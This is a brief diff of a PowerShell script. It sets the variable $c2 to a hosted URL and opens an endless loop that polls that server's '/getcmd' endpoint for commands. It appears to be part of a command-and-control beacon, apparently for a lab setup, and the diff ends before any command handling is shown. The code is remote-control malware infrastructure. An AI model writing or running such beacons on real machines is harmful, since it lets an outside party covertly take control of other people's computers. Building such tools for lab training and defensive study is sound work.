@@ -1,4 +1,4 @@
-$c2 = 'RENDER_URL_PLACEHOLDER'
+$c2 = 'https://lab-c2.onrender.com'
 while($true) {
     try {
         $r = (Invoke-WebRequest -Uri "$c2/getcmd" -UseBasicParsing).Content | ConvertFrom-Json
